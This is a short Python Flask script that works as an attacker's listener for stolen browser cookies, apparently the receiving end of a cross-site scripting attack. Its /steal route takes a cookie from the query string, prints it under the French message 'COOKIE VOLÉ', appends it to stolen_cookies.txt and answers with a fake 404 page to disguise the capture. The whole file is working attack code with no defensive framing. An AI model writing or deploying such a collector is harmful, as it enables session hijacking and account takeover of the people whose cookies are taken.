from flask import Flask, request

app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('c')
    print(f"[!] COOKIE VOLÉ : {cookie}")
    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"{cookie}\n")
    return '<h1>404 Not Found</h1>', 404

if __name__ == '__main__':
    app.run(port=5001, debug=True)